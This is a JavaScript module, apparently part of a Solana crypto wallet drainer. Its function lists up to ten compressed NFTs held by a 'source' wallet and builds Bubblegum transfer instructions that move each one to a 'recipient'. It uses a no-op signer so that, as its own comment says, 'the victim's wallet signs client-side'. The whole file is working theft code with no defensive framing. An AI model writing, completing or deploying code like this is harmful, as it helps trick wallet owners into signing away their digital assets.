import bs58 from "bs58";
import { createUmi } from "@metaplex-foundation/umi-bundle-defaults";
import { mplBubblegum, getAssetWithProof, transfer } from "@metaplex-foundation/mpl-bubblegum";
import { publicKey, createNoopSigner } from "@metaplex-foundation/umi";
import { PublicKey, TransactionInstruction } from "@solana/web3.js";
import { listCompressedAssets } from "./das.js";

let cachedUmi = null;
let cachedUmiUrl = null;

function getUmi(dasUrl) {
  if (cachedUmi && cachedUmiUrl === dasUrl) return cachedUmi;
  cachedUmi = createUmi(dasUrl).use(mplBubblegum());
  cachedUmiUrl = dasUrl;
  return cachedUmi;
}

function umiIxToWeb3(umiIx) {
  return new TransactionInstruction({
    programId: new PublicKey(umiIx.programId.toString()),
    keys: umiIx.keys.map((k) => ({
      pubkey: new PublicKey(k.pubkey.toString()),
      isSigner: k.isSigner,
      isWritable: k.isWritable,
    })),
    data: Buffer.from(umiIx.data),
  });
}

export async function planCompressedSweep({ dasUrl, source, recipient, maxAssets = 10 }) {
  if (!dasUrl) {
    return { assets: [], instructions: [], total: 0, selected: 0, note: "DAS not configured" };
  }

  const umi = getUmi(dasUrl);

  let compressed;
  try {
    compressed = await listCompressedAssets(dasUrl, source, 500);
  } catch (err) {
    return {
      assets: [],
      instructions: [],
      total: 0,
      selected: 0,
      note: `DAS list failed: ${err.message}`,
    };
  }

  const selected = compressed.slice(0, maxAssets);
  const out = [];

  for (const asset of selected) {
    try {
      // getAssetWithProof fetches the asset + Merkle proof via DAS and
      // returns the fields transfer() needs: merkleTree, root, dataHash,
      // creatorHash, nonce, index, proof.
      const assetWithProof = await getAssetWithProof(umi, publicKey(asset.id), {
        truncateCanopy: true,
      });

      // createNoopSigner satisfies the leafOwner signer requirement
      // without actually signing — the victim's wallet signs client-side.
      const builder = transfer(umi, {
        ...assetWithProof,
        leafOwner: createNoopSigner(publicKey(source)),
        newLeafOwner: publicKey(recipient),
      });

      const umiInstructions = builder.getInstructions();
      const web3Ixs = umiInstructions.map(umiIxToWeb3);

      out.push({
        assetId: asset.id,
        name: asset.content?.metadata?.name || "unknown",
        tree: asset.compression?.tree || null,
        instructions: web3Ixs,
      });
    } catch (err) {
      out.push({ assetId: asset.id, error: err.message });
    }
  }

  const usable = out.filter((a) => !a.error && a.instructions);
  return {
    assets: out,
    instructions: usable,
    total: compressed.length,
    selected: selected.length,
  };
}
